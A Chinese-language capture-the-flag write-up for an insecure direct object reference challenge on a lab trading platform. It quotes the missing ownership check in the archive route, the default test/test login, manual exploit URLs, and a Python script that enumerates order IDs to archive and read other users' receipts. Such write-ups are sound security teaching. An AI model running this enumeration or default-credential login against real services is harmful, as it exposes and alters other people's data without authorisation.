# XWriteUp

## 1、题目描述

这是一个交易平台的 IDOR(Insecure Direct Object Reference)漏洞挑战。题目提示每次看到类似 ID 的值时都应该尝试用相似的值进行模糊测试,但要注意结果可能会显示在其他地方。

该平台存在两个主要漏洞:

- **IDOR 漏洞**: 订单归档功能缺乏授权检查
- **默认凭证**: 存在测试账号 `test/test`

Flag 存储在订单 ID 为 `300198` 的订单收据中。

## 2、知识点

1. **IDOR (Insecure Direct Object Reference)**: 不安全的直接对象引用,应用程序使用用户提供的输入来直接访问对象,但没有进行适当的授权检查
2. **Broken Authorization**: 破坏的授权机制,允许用户访问或修改不属于他们的资源
3. **默认凭证**: 系统使用已知的默认用户名和密码
4. **间接 IDOR**: 漏洞的影响不是直接显示,而是在其他位置(归档页面)体现

## 3、题目解题方法思路

### 关键路径分析:

1. **登录系统**: 使用默认凭证 `test/test` 登录
2. **发现 IDOR 漏洞**: 在 `/order/<order_id>/archive` 路由中,代码只检查用户是否登录,但没有验证该用户是否是订单的创建者
3. **利用漏洞**: 通过修改 `order_id` 参数,可以归档任意订单(包括不属于自己的订单)
4. **查看结果**: 归档的订单会出现在 `/orders_archive` 页面,从而可以查看其收据

### 使用的知识点:

- **IDOR 漏洞利用**: 通过参数篡改访问未授权资源
- **HTTP 请求拦截**: 修改请求参数

### 工具和方法:

- 浏览器开发者工具或 Burp Suite 拦截请求
- 手动修改 URL 参数进行测试

## 4、解题步骤

### 步骤 1: 登录系统

访问登录页面,使用默认凭证登录:

- 用户名: `test`
- 密码: `test`

### 步骤 2: 查看当前订单

登录后访问 `/orders` 页面,可以看到当前用户(test)的活跃订单:

- Order 300123
- Order 300214
- Order 300327

### 步骤 3: 分析代码发现漏洞

在 routes.py 中的 `order_archive` 函数存在漏洞:

```python
# 没有检查当前用户是否是订单的创建者
order = Order.query.filter(Order.id == order_id).first_or_404()
order.archiver = user
order.archived = True
```

### 步骤 4: 枚举订单 ID

根据已知订单 ID (300123, 300214, 300327, 300481),可以推测 ID 范围在 300000-300999 之间。从初始化代码中可以看到 flag 订单 ID 为 `300198`。

### 步骤 5: 利用 IDOR 漏洞归档 flag 订单

访问以下 URL 归档 flag 订单:

```
http://localhost:5000/order/300198/archive
```

### 步骤 6: 查看归档订单

访问归档订单页面:

```
http://localhost:5000/orders_archive
```

### 步骤 7: 查看 flag 订单收据

点击订单 300198 的收据链接或直接访问:

```
http://localhost:5000/order/300198/receipt
```

即可在收据内容中看到 flag。

## 5、EXP

以下是自动化利用脚本:

```python
import requests
import re

# 配置
BASE_URL = "http://ip32769"
USERNAME = "test"
PASSWORD = "test"


def exploit():
    # 创建会话
    session = requests.Session()

    print("[*] 步骤1: 登录系统")
    # 登录 - 第一步提交用户名
    login_data = {"username": USERNAME}
    response = session.post(f"{BASE_URL}/", data=login_data)
    print(f"[+] 提交用户名,状态码: {response.status_code}")

    # 登录 - 第二步提交密码
    password_data = {"password": PASSWORD}
    response = session.post(f"{BASE_URL}/password/{USERNAME}", data=password_data)
    print(f"[+] 提交密码,状态码: {response.status_code}")

    print("\n[*] 步骤2: 枚举并归档订单")
    # 尝试归档订单ID范围
    archived_orders = []
    for order_id in range(300000, 300501):
        archive_url = f"{BASE_URL}/order/{order_id}/archive"
        response = session.get(archive_url)
        if response.status_code == 200:
            print(f"[+] 成功归档订单 {order_id}")
            archived_orders.append(order_id)
        elif response.status_code == 404:
            # 订单不存在,继续下一个
            continue
        else:
            print(f"[-] 归档订单 {order_id} 失败,状态码: {response.status_code}")

    print(f"\n[+] 共归档 {len(archived_orders)} 个订单")

    print("\n[*] 步骤3: 查看归档订单列表")
    response = session.get(f"{BASE_URL}/orders_archive")
    print(f"[+] 归档列表状态码: {response.status_code}")

    print("\n[*] 步骤4: 尝试获取每个归档订单的收据")
    for target_order_id in archived_orders:
        receipt_url = f"{BASE_URL}/order/{target_order_id}/receipt"
        response = session.get(receipt_url)

        if response.status_code == 200:
            # 直接在响应文本中搜索flag
            content = response.text

            # 方法1: 搜索包含flag关键词的内容
            flag_pattern = r"flag[:\s]*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"
            flag_match = re.search(flag_pattern, content, re.IGNORECASE)

            if flag_match:
                flag = flag_match.group(1)
                print(f"\n[!] FLAG找到 (关键词): {flag}")
                print(f"[+] 来自订单ID: {target_order_id}")
                return flag

            # 方法2: 直接搜索UUID格式
            uuid_pattern = (
                r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
            )
            uuid_match = re.search(uuid_pattern, content, re.IGNORECASE)

            if uuid_match:
                flag = uuid_match.group(0)
                print(f"\n[!] FLAG找到 (UUID): {flag}")
                print(f"[+] 来自订单ID: {target_order_id}")
                return flag

            # 方法3: 搜索 "flag" 关键词附近的内容
            if "flag" in content.lower():
                print(f"[+] 订单 {target_order_id} 包含 'flag' 关键词")
                # 提取flag周围的文本查看
                flag_index = content.lower().index("flag")
                context = content[max(0, flag_index - 50) : flag_index + 150]
                print(f"[+] 上下文: {context}")
            else:
                print(f"[-] 订单 {target_order_id} 中未找到flag")
        else:
            print(
                f"[-] 获取订单 {target_order_id} 收据失败,状态码: {response.status_code}"
            )

    return None


if __name__ == "__main__":
    exploit()
```

### 手动利用步骤:

1. 访问 `http://localhost:5000/`
2. 输入用户名 `test`,点击继续
3. 输入密码 `test`,点击登录
4. 在浏览器地址栏访问: `http://localhost:5000/order/300198/archive`
5. 访问归档页面: `http://localhost:5000/orders_archive`
6. 点击订单 300198 查看收据,或直接访问: `http://localhost:5000/order/300198/receipt`
7. 在收据内容中获取 flag
